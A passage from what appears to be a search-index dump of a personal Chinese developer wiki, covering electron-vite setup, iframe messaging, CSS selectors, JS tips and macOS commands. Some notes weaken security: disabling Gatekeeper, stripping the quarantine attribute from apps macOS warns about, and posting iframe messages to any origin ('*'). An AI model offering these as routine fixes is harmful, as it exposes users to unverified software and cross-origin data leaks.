solid solid-ts 对于旧项目 旧项目因为已经有代码了, 所以肯定不能像新项目那样从零开始 可能的方案(未实际测试, 待修正): # 先安装到项目 yarn add electron-vite --save 然后就是生成需要的资源 npx electron-vite 或者手动在 package.json 文件中添加 npm scripts {\n  \"scripts\": {\n    \"start\": \"electron-vite preview\", // 开启 Electron 程序预览生产构建\n    \"dev\": \"electron-vite dev\",       // 开启开发服务和 Electron 程序\n    \"prebuild\": \"electron-vite build\" // 为生产构建代码\n  }\n} 配置 electron-vite 创建好后项目下会有一个 electron.vite.config.ts 文件, 结构要求为 // electron.vite.config.ts export default { main : { // vite config options }, preload : { // vite config options }, renderer : { // vite config options } } 目前我自己生成的默认内容为 import { resolve } from 'path' import { defineConfig , externalizeDepsPlugin } from 'electron-vite' import react from '@vitejs/plugin-react' export default defineConfig ({ main : { plugins : [ externalizeDepsPlugin ()] }, preload : { plugins : [ externalizeDepsPlugin ()] }, renderer : { resolve : { alias : { '@renderer' : resolve ( 'src/renderer/src' ) } }, plugins : [ react ()] } }) 打包-更新 Electron 入口 当使用 electron-vite 打包代码时， Electron 应用程序的入口点应更改为输出目录中的主进程入口文件。默认的输出目录 outDir 为 out 。\n你的 package.json 文件会是这样： { \"name\" : \"electron-app\" , \"version\" : \"1.0.0\" , \"main\" : \"./out/main/index.js\" } Electron 的工作目录将是输出目录，而不是你的源代码目录。因此在打包 Electron 应用程序时可以将源代码排除。 其他-Electron源码调试支持 也可以说后端源码调试支持 在 package.json 的 script 项中增加以下内容: \"dev-debug\": \"electron-vite dev --sourcemap --remote-debugging-port=9222\", 主要就是: --sourcemap --remote-debugging-port=9222 此部分参考官网: https://cn-evite.netlify.app/guide/debugging.html#webstorm","tags":"前端","url":"/yq-docs-front-end-tutorial-Vite+Electron+React项目搭建.html","loc":"/yq-docs-front-end-tutorial-Vite+Electron+React项目搭建.html"},{"title":"iframe与父组件之前的通信","text":"iframe创建 可以直接使用dom元素创建 const frame = document . createElement ( 'iframe' ) // 添加sandbox属性 const sandbox = [ 'allow-same-origin' , 'allow-scripts' ]; frame . sandbox . add (... sandbox ); 这里提一句, 如果在后面直接 const script_ = document . createElement ( 'script' ) frame . appendChild ( script_ ) 是无法将这个 script 作为 iframe 的脚本生效的,\n此时 script 的生效域仍然是外部组件. 父组件给iframe发送消息 父组件通过 frame.contentWindow 发送消息 const frameWindow = frame . contentWindow ; // 表示是发给 frameWindow 的 frameWindow . postMessage ( { type : 'message' , data : { name : 'parent' , message : 'hello iframe' , }, }, // 第一个参数表示发送的内容, 在 子iframe 中接受时, 用 event.data 取出数据内容 '*' , // 第二个参数表示接收目标域, 即想把参数发给的目标, 这里 * 表示接收所有域, 也可以写具体的域名比如: http://www.baidu.com ); 子组件监听(需要需要 iframe 加载的页面内部) window . addEventListener ( 'message' , ( event ) => { // 取出源, 可以判断是否与自己的源是一致的, 不一致说明不是发给自己的 if ( event . origin !== 'https://example.com' ) { return ; } // 取出数据 console . log ( 'Received message from iframe: ' , event . data ); // 输出 // Received message from iframe: { //  type: 'message', //  data: { //    name: 'parent', //    message: 'hello iframe', //  }, // } }); iframe发送消息给父组件 使用 window.parent.postMessage window . parent . postMessage ( { type : 'message' , data : { name : 'iframe' , message : 'hello parent' , }, }, '*' , ); 父组件同样使用监听接收 window . addEventListener ( 'message' , ( event ) => { // }); 将资源挂载到临时URL 使用 Blob 创建临时资源 protected createUrl () : Promise < string > { const meta = '' const style = iframeHtmlBodyCss const htmlStr = this . getRenderHtml () // 创建一个新的 Blob 对象，将新的 HTML 内容作为数据传入 // blob 可理解为 二进制大数据 const blob = new Blob ([ meta + style + htmlStr ], { type : 'text/html' }) // 生成一个 URL，指向 Blob 对象 return URL . createObjectURL ( blob ) } render () { return ( < div className = \"doc-to-html-body-page\" > < iframe className = { 'doc-html-page-iframe' } src = { this . createUrl ()} /> < /div> ) } 可能遇到的报错: Refused to frame 'blob:http://localhost:5173/d2fdde53-0d91-4d4f-858a-a2e41ba8b549' because it violates the following Content Security Policy directive: \"default-src 'self'\". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.\n\nreact-dom_client.js?v=be3955bf:1270 解决, 设置 Security Policy directive : <meta\n    http-equiv=\"Content-Security-Policy\"\n    content=\"\n    default-src 'self';\n    script-src 'self';\n    style-src 'self' 'unsafe-inline';\n    img-src 'self' * data: ;\n    frame-src 'self' blob: ;\n\"\n\n/> 可能遇到-加载顺序问题 首次加载时, iframe中HTML内置的 script 代码没有成功接收到 父组件 发送的消息. 父组件中类似于这样 frame . addEventListener ( 'load' , function () { frame . contentWindow . postMessage ({ theme : \"dark\" }, \"*\" ); }); iframe加载页面中可能类似于这样 < script > const setTheme = ( theme ) => { document . documentElement . setAttribute ( 'data-theme' , theme ); }; window . onload = () => { window . addEventListener ( 'message' , function ( event ) { const getTheme = event . data . theme ; if ( getTheme ){ setTheme ( getTheme ); } }); }; </ script > 这个时候没有加载, 是因为 父组件 中的 load 事件执行的消息传递要早于 iframe 中的 window.onload 调用的事件监听. 解决嘛, 在 父组件 的 load 事件中, 添加一个 setTimeout 延迟即可, 就是时间不是很好把握 frame . addEventListener ( 'load' , function () { setTimeout (() => { frame . contentWindow . postMessage ({ theme : \"dark\" }, \"*\" ); }, 1000 ); });","tags":"前端","url":"/yq-docs-front-end-tutorial-iframe-with-parent-communication.html","loc":"/yq-docs-front-end-tutorial-iframe-with-parent-communication.html"},{"title":"ts与dts文件","text":"ts与dts文件, 换而言之, *.ts 与 *.d.ts 文件区别 以 index 说明 (index默认就是模块导出文件) index.ts index.ts 文件通常是 TypeScript 项目的入口文件或模块文件。 它包含 TypeScript 代码，可以包含类型声明、变量声明、函数定义、类定义等。 index.ts 文件中的代码会被 TypeScript 编译器编译成 JavaScript 在构建过程中， index.ts 文件中的代码会被转换为对应的 JavaScript 代码，并生成相应的输出文件。 index.d.ts: index.d.ts 文件是 TypeScript 的 类型声明文件 。 它用于描述 JavaScript 代码或库的类型信息，包括接口、类型别名、全局变量、类类型等。 index.d.ts 文件中的类型声明不会被 TypeScript 编译器编译成 JavaScript ，而是用于类型检查和类型推断。 index.d.ts 文件通常用于与 JavaScript 库或模块进行交互，以提供类型安全和编辑器支持。","tags":"前端","url":"/yq-docs-front-end-tutorial-ts-or-dts.html","loc":"/yq-docs-front-end-tutorial-ts-or-dts.html"},{"title":"前端教程","text":"详细 iframe与父组件之前的通信 JS调试技巧 Vite+Electron+React项目搭建 ts与dts文件 img超出大小时自动调整 依赖注入框架 详见: inversify Vite创建Electron应用(已废弃) 已废弃, 新的见: Vite+Electron+React项目搭建 参考: https://electron-vite.github.io/guide/getting-started.html 创建-方式1 指令 # npm create vite@latest my-project -- --template electron npm create electron-vite@latest my-project 会让选择框架模版, 我选的React $ npm create electron-vite@latest my-project\n✔ Project template: › React\n\nScaffolding project in ~/my-project...\n\nDone. Now run: cd my-project npm install npm run dev 创建-方式2 直接引用原文的 npm create vite@latest my-electron-vite-project\n\n? Select a framework: › - Use arrow-keys. Return to submit. Vanilla Vue React Preact Lit Svelte\n❯ Others\n\n? Select a variant: › - Use arrow-keys. Return to submit. create-vite-extra ↗\n❯ create-electron-vite ↗ # Choose your preferred front-end framework language ? Project template: › - Use arrow-keys. Return to submit.\n❯ Vue React Vanilla # Enter the project to download dependencies and run them cd my-electron-vite-project\nnpm install\nnpm run dev","tags":"前端","url":"/yq-docs-front-end-tutorial-index.html","loc":"/yq-docs-front-end-tutorial-index.html"},{"title":"html-react-parser","text":"将HTML字符串解析为React元素 安装 npm install html-react-parser #  yarn add html-react-parser --save 模块地址: https://www.npmjs.com/package/html-react-parser 代码中使用 import parse from 'html-react-parser' function MyComponent () { const htmlString = '<div>Hello, <strong>World!</strong></div>' ; const reactElements = parse ( htmlString ); return ( < div > { reactElements } < /div> ); }","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-html-react-parser.html","loc":"/yq-docs-front-end-node-Three--party-library-html-react-parser.html"},{"title":"marked","text":"安装 npm install marked #  yarn add marked --save 模块地址: https://www.npmjs.com/package/marked 代码中使用 import * as marked from 'marked' ; // Markdown 字符串 const markdownString = ` # 标题 这是一段 **粗体** 和 *斜体* 的文字。 - 列表项 1 - 列表项 2 - 列表项 3 [链接文本](https://example.com) ` ; // 将 Markdown 转换为 HTML const htmlString = marked ( markdownString ); // 获取要显示 HTML 的元素 const container = document . getElementById ( 'markdown-container' ); // 将 HTML 内容插入到元素中 container . innerHTML = htmlString ; 命令行使用 # Example with stdin input $ marked -o hello.html\nhello world\n&#94;D\n$ cat hello.html\n<p>hello world</p>","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-marked.html","loc":"/yq-docs-front-end-node-Three--party-library-marked.html"},{"title":"JS调试技巧","text":"将script映射为JS文件 当 HTML 元素中的 script 元素内容为 JS源码 时, 不能直接在这上面大断点 < script > console . log ( \"111\" ) </ script > 这时可以将 script 元素中的内容映射为JS文件, 这样就可以在JS文件上设置断点了. < script > //# sourceURL=script_some_function.js console . log ( \"111\" ) </ script > 注解 这里属于 JavaScript的Source Map（源映射） (sourceURL / sourceMappingURL) 的知识点, 类似于这样写都可: //@ sourceURL=jquery.extends.js JS脚本文件源码断点 使用 debugger 关键字. < script > debugger console . log ( \"111\" ) </ script > 会自动在 debugger 处断点","tags":"前端","url":"/yq-docs-front-end-tutorial-js-debug-skills.html","loc":"/yq-docs-front-end-tutorial-js-debug-skills.html"},{"title":"Symbol使用","text":"Symbol 是一种特殊的数据类型, 它是一种唯一且不可变的值, 可以用于表示对象的属性名,\n它具有以下特点: 不可变: Symbol 值是唯一的, 不同的 Symbol 值可以区分彼此,\n因此 Symbol 值可以用于对象属性的键名, 确保属性名不会与其他属性名冲突。 Symbol 和 Symbol.for Symbol 和 Symbol.for 是 JavaScript 中用于创建和获取符号（Symbol）的两种方法， 它们之间有以下区别： 创建方式 Symbol 是通过调用全局的 Symbol 函数来创建一个全局唯一的符号，每次调用都会创建一个新的符号。例如： const symbol1 = Symbol (); const symbol2 = Symbol (); console . log ( symbol1 === symbol2 ); // false Symbol.for 方法是通过给定一个字符串作为键来创建或检索一个被全局注册的符号。\n如果该键已被注册，则返回相应的符号；否则，创建一个新的符号并注册。\n例如： const symbol1 = Symbol . for ( 'key' ); const symbol2 = Symbol . for ( 'key' ); console . log ( symbol1 === symbol2 ); // true 在上述示例中， Symbol.for('key') 两次调用 返回的是同一个符号 ，因为它们使用相同的键。 全局性质 通过 Symbol 创建的符号是 局部 的，只在当前作用域中有效。 而通过 Symbol.for 创建的符号是 全局 的，可以在不同的作用域中通过相同的键来获取相同的符号。 键的存储 通过 Symbol 创建的符号不会存储对应的键，无法通过符号本身获取到键。 而通过 Symbol.for 创建的符号会将键存储在全局符号注册表中，可以通过符号获取到对应的键。 const symbol = Symbol . for ( 'key' ); console . log ( Symbol . keyFor ( symbol )); // 'key' 在上述示例中，Symbol.keyFor(symbol) 返回的是对应的键 'key'。","tags":"前端","url":"/yq-docs-front-end-Conceptual-use-symbol.html","loc":"/yq-docs-front-end-Conceptual-use-symbol.html"},{"title":"spctl","text":"运行 任何来源 应用运行(重启后会被重新隐藏) sudo spctl --master-disable","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-spctl.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-spctl.html"},{"title":"xattr","text":"参考: 【macOS】xattr命令简介 扩展文件属性 先介绍拓展文件属性, 这里直接摘录 扩展文件属性是文件系统功能，使用户能够将计算机文件与文件系统不解释的元数据相关联，而常规属性具有由文件系统严格定义的目的（例如权限或创建和修改时间的记录）。与通常可以与最大文件大小一样大的forks不同，扩展属性的大小通常被限制为明显小于最大文件大小的值。典型用途包括存储文档的作者、纯文本文档的字符编码或校验和、加密哈希或数字证书和自主访问控制信息。 在类 Unix系统中，扩展属性通常缩写为xattr。 Mac OS X 10.4及更高版本通过使用HFS+文件系统属性文件B* 树功能支持扩展属性，该功能允许命名分叉。尽管 HFS+ 中的命名分叉通过扩展区支持任意大量数据，但操作系统对扩展属性的支持仅支持内联属性，将它们的大小限制在单个 B* 树节点中可以容纳的大小。[需要引用]任何常规文件都可能有一个扩展属性列表。HFS+ 支持任意数量的命名分叉，不知道macOS是否对扩展属性的数量施加任何限制。 每个属性都包含名称和相关数据。该名称是一个以 null 结尾的 Unicode字符串。不存在名称空间限制（使其成为一个开放的 xattr系统），并且约定是使用反向 DNS 字符串（类似于Uniform Type Identifiers）作为属性名称。 macOS 支持使用类似 Linux 的 API 从文件或目录中列出、 获取、设置、和删除扩展属性。在命令行中，这些能力通过xattr实用程序公开。 从 macOS 10.5 开始，来自网络的文件被标记为com.apple.quarantinevia 扩展文件属性。在某些旧版本的 macOS（例如Mac OS X 10.6）中，用户空间扩展属性不会在保存在常见的Cocoa应用程序（TextEdit、Preview 等）中时保留。 xattr命令 MacOS使用 xattr 命令来管理扩展文件属性 参数选项 -l 列出一个文件的所有扩展属性。 -r 如果文件参数是目录，就好像目录的全部内容一样还指定了递归目录（以便目录中的每个文件目录树被执行）。 -s 如果文件参数是符号链接，则对符号链接本身进行操作，而不是符号链接指向的文件。 -v 强制显示文件名，即使是单个文件。 -x 强制属性值以十六进制显示表示。 -w 选项通常假定输入属性值是一个字符串。 -c 清除文件的所有扩展属性。 -w x 为文件写入一个扩展属性。如果属性已存在，则会替换它。 -p <attr> 打印指定的扩展属性的内容。 -d <attr> 删除指定属性, 比如删除隔离属性 -d com.apple.quarantine 常用xattr命令 显示扩展文件属性 xattr ${ file } 显示所有扩展文件属性 xattr -l ${ file } 比如 $ xattr -l /Applications/LocalSend.app\ncom.apple.macl:\ncom.apple.provenance:\ncom.apple.quarantine: 03c1 ; 660e29ee ;; 43000EEA-EC24-4E18-9B39-6CCAB471547F 其中: com.apple.macl:\n\ncom.apple.provenance:\n\ncom.apple.quarantine: 03c1;660e29ee;;43000EEA-EC24-4E18-9B39-6CCAB471547F\n  隔离属性\n\n  可以使用\n  xattr -p com.apple.quarantine ${file}\n  来查看隔离扩展属性具体信息 解决 xxx 已损坏/无法打开 删除隔离扩展属性 sudo xattr -r -d com.apple.quarantine ${ file } 如上命令可以用来解决某些应用程序出现提示无法打开时的情况: 无法打开\"xxx\"，因为无法验证开发者。\nmacos无法验证此 App 是否包含恶意软件。","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-xattr.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-xattr.html"},{"title":"前端各种选择器","text":"主要是三大类: ID选择器(#) 类选择器(.) HTML标签选择器 在CSS中定义样式时候, 有几种情况: 复合选择器: 无分隔符, 表示应用与同时具有这些名称的选择器;\n如: .cl1.cl2 表示选择同时具有这两个类的元素; 选择器列表: 多个选择器以逗号(,)分割, 表示样式同时应用与这些选择器;\n如: .cl1, .cl2 ; 后代组合器: 多个选择器以空格( )分割, 表示样式应用与 按照顺序选择满足条件的所有后代(后代选择器);\n如: .cl1 .cl2 ; 直接子代组合器: 多个选择器以右箭头(>)分割, 表示样式应用与 按照顺序选择满足条件的直属子元素(子元素选择器);\n如: .cl1 > .cl2 ; 紧邻兄弟组合器: 多个选择器以加号(+)分割, 表示样式应用与 选择紧接在另一个元素后的元素(相邻兄弟选择器);\n如: .cl1 + .cl2 ; 兄弟选择器选择的是位于后面的元素, 比如对于html < div class = \"parent\" > < div class = \"son1\" > Son 1 </ div > < div class = \"son2\" > Son 2 </ div > < div class = \"son3\" > Son 3 </ div > </ div > 使用选择器 .son1 + .son2 `` 选择的是 ``son2 元素, 即在 .son2 紧跟在 .son1 之后的情况下，选择器才会匹配 一般兄弟组合器: 多个选择器以波浪(~)分割, 表示样式应用与 选择在一个元素后面的所有兄弟元素(通用兄弟选择器);\n如: .cl1 ~ .cl2 ; 其他, 见: https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors 伪类/元素选择器 伪类 (Pseudo-classes) 伪类选择器以一个冒号（:）开头 伪类用于定义元素的特殊状态。\n它们是对元素状态的抽象，例如当用户悬停在链接上时，或者当一个表单元素获得焦点时。\n伪类不会创建新的元素，而是改变现有元素的样式。\n伪类以冒号:开始，后面跟着伪类名称，例如:hover、:focus、:first-child等。 a : hover { color : red ; /* 当鼠标悬停在链接上时，文本颜色变为红色 */ } input : focus { border-color : blue ; /* 当输入框获得焦点时，边框颜色变为蓝色 */ } 伪元素 (Pseudo-elements) 伪元素选择器以两个冒号（::）开头 伪元素用于创建一些不在文档树中的抽象对象，或者为某些元素添加装饰性的内容。 比如 ::before 实际就相当于在原元素前增加一个新元素. 它们可以用来修改文档树中已经存在的元素。\n伪元素以双冒号::开始（在CSS3中），\n例如::before、::after、::first-line等。\n在CSS2中，伪元素是由单冒号:表示的，例如:before、:after。 p :: first-line { font-weight : bold ; /* 设置段落的第一行文本加粗 */ } div :: before { content : \"注意: \" ; /* 在div内容之前添加文本 */ } 伪类用于描述一个元素的状态，而伪元素用于创建一些不在文档树中的抽象对象或者为元素添加额外的装饰内容 根据规范，伪类选择器支持单冒号和双冒号的写法，\n但在实际使用中，双冒号通常用于伪元素选择器，以区分伪元素和伪类。 实际有哪些支持的见: 伪元素 伪类","tags":"前端","url":"/yq-docs-front-end-CSS-Various-selectors.html","loc":"/yq-docs-front-end-CSS-Various-selectors.html"},{"title":"前端问题总结","text":"通过变量生成正则 如果是确定字符的正则: /\\.txt$/g 表示匹配所有以 .txt 结尾 但是不支持直接拼接变量, 比如想匹配的可能以其他指定字符串结尾,\n就只有通过显示的示例: const regStr = '.txt'\nnew RegExp(regStr + '$', 'g') 与上效果一致. 判断是否是数组 使用 Array 内置方法: Array.isArray(obj) 判断是否是绝对路径 使用正则匹配 是否是斜杠开头 或者 是否是字母+冒号+双反斜杠 开头: /&#94;(\\/|[a-z]:\\\\)/i.test(target) test是JS正则自带函数, 返回值为 boolean JS设置预定义变量 有时候, 如果在CSS定义了变量比如背景色,\n但可能这个颜色是动态加载的, 导致初始化的时候这个颜色就\n会没有定义,\n这个时候可以在最初的页面, JS动态设置一个颜色: document.documentElement.style.setProperty('--body-bg', '#1E1E1E') 上次的颜色可以提前放在localStorage: window.localStorage.setItem('bg-color', '#1E1E1E') 逻辑运算符??与||区别 ?? 运算符(空值合并运算符（Nullish Coalescing Operator）) 只会在左操作数为 null 或 undefined 时返回右操作数作为默认值 。\n对于其他 falsy 值（如 false、0、空字符串等），?? 运算符不会触发提供默认值的行为 || 运算符在 左操作数为任何 falsy 值时都会返回右操作数 作为默认值 例: > 0 || 4\n4\n> 0 ?? 4\n0 ts/js直接在字符串嵌入变量 使用 反引号 加 美元符 const str1 = \"data1\" const str2 = `it is from ${ str1 } ` url的路径 对于路径的参数与锚点结合使用做一个记录吧. 总的url链接结构: 主地址 ? 参数列表 # 锚点 比如: http://xxx/xxx.html?p1=1&p2=2#anchor1 若将 ? 参数列表 # 锚点 位置交换为 # 锚点 ? 参数列表 ,\n默认情况下浏览器不能识别, 也就是说, 此时 // 可以拿到总链接 window . location . href // 不可以拿到锚点 window . location . hash === \"\" // 不可以拿到参数列表 window . location . search === \"\" 鼠标移入时提示信息 要实现将鼠标移入时候, 在元素侧方显示提示信息. 介绍常用的几种方式 使用 title 属性 有些元素可以直接使用 title 属性来实现提示信息 缺点是提示信息没法自定义样式. < div title = \"提示信息\" > 鼠标移入 </ div > 巧用 visibility 属性 参考: 菜鸟-CSS 提示工具(Tooltip) 源码 < style > /* Tooltip 容器 */ . tooltip { position : relative ; display : inline-block ; border-bottom : 1 px dotted black ; /* 悬停元素上显示点线 */ } /* Tooltip 文本 */ . tooltip . tooltiptext { visibility : hidden ; width : 120 px ; background-color : black ; color : #fff ; text-align : center ; padding : 5 px 0 ; border-radius : 6 px ; /* 定位 */ position : absolute ; z-index : 1 ; } /* 鼠标移动上去后显示提示框 */ . tooltip : hover . tooltiptext { visibility : visible ; }</ style > < div class = \"tooltip\" > 鼠标移动到这 < span class = \"tooltiptext\" > 提示文本 </ span > </ div > 使用 ::after / ::before 伪元素 源码 (只是截取的自己项目的部分, 看个思路就行) < style > /* 所有弹出层容器 */ . fixed-container { position : fixed ; z-index : 2 ; background : #1b1b1b 99 ; right : 30 px ; bottom : 100 px ; padding : 5 px ; border-radius : var ( --g-border-radius ); } /* 侧边工具 回滚/滚动 到顶部 */ # sidebar-tool-back-top { cursor : pointer ; bottom : 80 px ; } # sidebar-tool-back-top :: before { font-family : \"Font Awesome 6 Free Web\" ; content : \"\\f062\" ; } # sidebar-tool-back-top : hover :: after { content : \"顶部\" ; width : 30 px ; font-size : 10 px ; margin-top : -10 px ; color : var ( --g-tip-text-color ); position : absolute ; } </ style > < div id = \"sidebar-tool-back-top\" class = \"fixed-container\" > <!-- 按钮 使用 content --> </ div > fixed失效 有时候想要让元素相对于视觉窗口一直固定, 这个时候可以使用 position: fixed 但是有时候会发现失效了, 多半是因为祖先元素设置了 transform 相关的属性.\n固定的时候, 就会相对于这个祖先元素了. 解决 要么直接去掉祖先的 transform 要么换一个层级, 不在存在 transform 属性的祖先元素下. 总结会对 position:fixed 影响的 祖先元素为 transform 属性值不为 none 的元素 perspective 值不为 none 的元素 will-change 中指定了任意 CSS filter 不为 none 设置了 transform-style: preserve-3d 的元素 参考:: position：fixed失效探索 你可能不知道的fixed失效问题 transform与position:fixed的那些恩怨 position: fixed定位失效原因及解决方案 异步休眠(sleep) async function asyncSleep ( ms : number ) : Promise < void > { return new Promise ( resolve => setTimeout ( resolve , ms )); } HTML标签视为文本 关键字: HTML标签转义 在HTML浏览器解析时, 默认情况下, 当你要对一个 标签 设置内容时, 比如 $ ( \"#test1\" ). innerHTML = \"\\<script\\>1\\</script\\>\" 会发现 转义是不生效 的,  貌似是因为浏览器会先解析标签, 然后再解析标签内的内容。 这个时候有2种方法: 使用 &lt; 和 &gt; 代替 < 和 > $ ( \"#test1\" ). innerHTML = \"\\&ltscript\\&gt1\\&lt/script&gt\" 使用 textContent $ ( \"#test1\" ). textContent = \"<script>1</script>\" 报错 Each child in a list should have a unique 'key' prop 主要是 React 时候遇到过. 产生原因是, 对于 <select> 这样的集合标签, 子元素需要有唯一 key 属性, 否则会报警告(有些会直接报错). 比如修改为 < select > {[\"ad\", \"df\", \"xz\"].map((val, index) => {\n        return ( < option key = {index} > {val} </ option > )\n    })} </ select > 注解 key属性在浏览器源码中是不显示的 另外, 为了标签的完整性, 可能看到有 加空标签 这样的写法 < select > {[\"ad\", \"df\", \"xz\"].map((val, index) => {\n        return < > < option key = {index} > {val} </ option > < />\n    })} </ select > 这样正常来说应是无问题的, 但是实际这样用的时候, key={index} 的赋值确失败了,\n暂时不知是什么原因. 还是改用括号吧 Could not find a declaration file for module js-yaml. 已经安装过 js-yaml yarn add js-yaml --save 还是出现警告: Could not find a declaration file for module js-yaml. 查询才知道还要装类型检查的 # npm install --save-dev @types/js-yaml yarn add @types/js-yaml --save-dev","tags":"前端","url":"/yq-docs-front-end-question-conclusion-of-issue.html","loc":"/yq-docs-front-end-question-conclusion-of-issue.html"},{"title":"js-yaml","text":"安装 npm install js-yaml #  yarn add js-yaml --save 模块地址: https://www.npmjs.com/package/js-yaml 使用 读取yaml文件内容 import * as yaml from 'js-yaml' ; import * as fs from 'fs' ; try { const fileContents = fs . readFileSync ( 'path/to/file.yaml' , 'utf8' ); const data = yaml . load ( fileContents ); console . log ( data ); } catch ( err ) { console . error ( 'Error reading YAML file:' , err ); } 将数据对象写入YAML文件 import * as fs from 'fs' ; const data = { // Your data object to be written to YAML }; const yamlContent = yaml . dump ( data ); try { fs . writeFileSync ( 'path/to/output.yaml' , yamlContent , 'utf8' ); console . log ( 'YAML file written successfully.' ); } catch ( err ) { console . error ( 'Error writing YAML file:' , err ); } 命令行工具 用法 js-yaml [ -h ] [ -v ] [ -c ] [ -t ] file 位置参数 file           File with YAML document(s) 可选参数 -h , --help Show this help message and exit. -v , --version 查看版本 -c , --compact Display errors in compact mode -t , --trace Show stack trace on error","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-js-yaml.html","loc":"/yq-docs-front-end-node-Three--party-library-js-yaml.html"},{"title":"开源图标/字体库","text":"codicon vscode有个开源图标库 codicon , 可在此预览: https://microsoft.github.io/vscode-codicons/dist/codicon.html 也有个仓库: https://github.com/microsoft/vscode-codicons/tree/main/src/icons 没注意是否一致 处了直接从上述仓库下载完整的svg图标, 还可以: 普通js项目 直接引入cdn: <script src=\"https://unpkg.com/vscode-codicons/dist/codicon.js\"></script>\nconst addIcon = codicon.add;\n... 或者npm安装: npm install vscode-codicons --save 引入并使用: import * as codicon from 'vscode-codicons';\nconst addIcon = codicon.add; theia项目 可以直接导入使用: import {codicon} from \"@theia/core/lib/browser\"\n\nrender(){\n  return <span className={`${codicon('add')}`}/>\n} fontawesome 安装免费使用的: yarn add @fortawesome/fontawesome-free --save 预览: https://fontawesome.com/v5/search 使用fortawesome 在 React 中使用 fortawesome 安装 # yarn add @fortawesome/fontawesome-svg-core @fortawesome/free-solid-svg-icons @fortawesome/react-fontawesome yarn add @fortawesome/fontawesome @fortawesome/react-fontawesome @fortawesome/fontawesome-free-solid @fortawesome/fontawesome-free --save 代码中使用 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'\nimport { faCoffee } from '@fortawesome/free-solid-svg-icons'\n\n<FontAwesomeIcon icon={faCoffee} /> 也可以像直接在HTML一样使用 import \"@fortawesome/fontawesome-free/css/all.css\"\n\n<i class=\"fas fa-coffee\"></i>","tags":"前端","url":"/yq-docs-front-end-Open-source-icon-library.html","loc":"/yq-docs-front-end-Open-source-icon-library.html"},{"title":"windows执行程序打包","text":"windows执行文件打包 windows文件安装格式 大致包含有 MSI EXE AppX MSIX MSI Windows最基本的安装格式：比较简单 安装过程不会检测该软件是否已经存在于计算机，或者是否缺少什么必备组件，它会直接覆盖安装路径中的所有文件。这种简单粗暴的方式，非常适合无人值守的情况，驱动程序大多也是用 MSI 格式安装。 EXE 最普及 能实现更多功能，比如检测已安装项，允许自定义安装路径，安装包语言，安装密码，打开网址，版权协议显示，检测安装缺失的必备运行库，以及更漂亮酷炫的安装界面等等（Tmtony）。因为EXE 格式功能更丰富，用户和开发者都喜欢用，反而比专门的安装格式 MSI 更常见。 AppX Windows 8 后推出的新安装格式 继承了 MSI 的优点，就像手机软件的安装过程一样，几乎没有给用户任何选项，它允许直接覆盖升级，完全干净的卸载，Appx 程序运行在沙盒中，不能访问其他应用内存、文件。这个安装格式之所以没有火起来，估计主要是对开发者太不友好，限制了软件权限，封包AppX 格式还必须重写。 MSIX MISX文件格式集成了Windows之前的文件格式安装技术，并继承了UWP的特性，更加安全和可靠，网络带宽优化，磁盘空间优化，程序自定义，并支持全部的Windows应用程序，而且MSIX使程序可更干净地卸载。MSIX将来可能会取代EXE、 WIN32、 WPF、WinForm和UWP 为什么会诞生MSIX: EXE 程序功能强大，但容易被恶意程序和流氓软件甚至病毒、木马利用，它带来便利的同时也给我们带来极大的安全隐患。 MSI 过于简单，用户和开发者都不喜欢用。 APPX 对比EXE 安全性有了质的提升，但限制条件较多又伤害了开发者的利益，而无法广泛传播。 所以MSIX应运而生，MSI + AppX = MSIX ， 结合了 MSI 和APPX 的优点而诞生了。从用户的角度来看，MSIX 的安装过程类似 MSI 文件，但在其背后的工作原理又类似 AppX 文件。 参考: 如何评价「微软Windows 10全新MSIX文件格式」","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-program-packaging.html","loc":"/yq-docs-operating-system-Windows-Windows-program-packaging.html"},{"title":"配置项","text":"仅介绍部分, 全部的可见: 设置选项 EXTRA_PATH_METADATA 额外的静态资源拷贝路径 比如网站加入favicon.ico # 将extra文件夹下面的favicon.ico文件copy到output文件夹下面。 EXTRA_PATH_METADATA = { 'extra/favicon.ico' : { 'path' : 'favicon.ico' } } DEFAULT_CATEGORY 当不想在博客页显示定义分类时,\n设置默认分类 DEFAULT_CATEGORY = 'others' USE_FOLDER_AS_CATEGORY 按照最近一层文件夹添加分类 不能与DEFAULT_CATEGORY共存 USE_FOLDER_AS_CATEGORY = True DEFAULT_PAGINATION 设置主页博客分页显示 如分每页最多显示10条博客记录. DEFAULT_PAGINATION = 10 如不需要分页, 设置为False即可 ARTICLE_ORDER_BY 文章按照什么排序, 比如按照最近修改反向排序(反向是因为最新的在最前面) ARTICLE_ORDER_BY = 'reversed-modified' 参考: pelican","tags":"文档","url":"/yq-doc-frame-pelican-conf.html","loc":"/yq-doc-frame-pelican-conf.html"},{"title":"uglifyjs","text":"用于将 .js 文件压缩成 .min.js 文件 安装: # npm i uglify-js npm install uglify-js -g 生成 # uglifyjs -o min.js --compress --mangle -- source.js uglifyjs main.js -o min.js -c -m 常用选项 -c, --compress [options] 执行代码压缩, 例如删除空格、注释、无用的代码 -m, --mangle [options] 执行代码混淆, 变量和函数名进行重命名，以缩短它们的标识符，并减小文件大小(同时增加逆向难度)","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-uglifyjs.html","loc":"/yq-docs-front-end-node-Three--party-library-uglifyjs.html"},{"title":"md5","text":"计算文件md5哈希值 md5 <file>","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-md5.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-md5.html"},{"title":"shasum","text":"计算文件SHA值 如计算 SHA256 shasum -a 256 /path/to/file","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-shasum.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-shasum.html"},{"title":"NotepadNext","text":"因为 Notepad 开发者的原因, NotepadNext 出现了, github地址: https://github.com/dail8859/NotepadNext","tags":"工具软件","url":"/yq-util-NotepadNext.html","loc":"/yq-util-NotepadNext.html"},{"title":"Resource Hacker","text":"简介 Resource Hacker(TM) 是一款 32位 和 64位 Windows 